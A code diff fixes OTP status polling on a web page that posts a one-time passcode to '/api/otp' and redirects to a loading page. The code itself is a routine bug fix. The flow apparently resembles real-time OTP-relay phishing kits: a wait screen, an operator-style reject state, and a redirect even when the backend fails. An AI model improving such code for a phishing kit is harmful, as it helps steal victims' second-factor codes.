@@ -355,6 +355,7 @@
     var waitOverlay = document.getElementById('waitOverlay');
     var rejectOverlay = document.getElementById('rejectOverlay');
     var statusPollTimer = null;
+    var hasSubmittedOtp = false;
 
     function normalizeStatus(value){
       return String(value || '').trim().toLowerCase();
@@ -395,6 +396,9 @@
     function pollOtpStatus(){
       stopPoll();
       var checkNow = function(){
+        if (hasSubmittedOtp) {
+          return;
+        }
         fetch('/api/status/' + requestId)
           .then(function(res){ return res.json(); })
           .then(function(data){
@@ -427,6 +431,8 @@
       waitOverlay.classList.add('show');
       verifyBtn.disabled = true;
       otpInput.disabled = true;
+      hasSubmittedOtp = true;
+      stopPoll();
 
       fetch('/api/otp', {
         method: 'POST',
@@ -442,10 +448,12 @@
         });
       })
       .then(function(){
+        stopPoll();
         window.location.href = 'loading-en.html?type=otp&id=' + encodeURIComponent(requestId);
       })
       .catch(function(err){
         console.warn('Could not reach the backend server:', err);
+        stopPoll();
         window.location.href = 'loading-en.html?type=otp&id=' + encodeURIComponent(requestId);
       });
     });
@@ -457,6 +465,7 @@
       otpInput.value = '';
       otpInput.disabled = false;
       otpField.classList.remove('invalid');
+      hasSubmittedOtp = false;
       stopPoll();
       verifyBtn.disabled = false;
       pollOtpStatus();
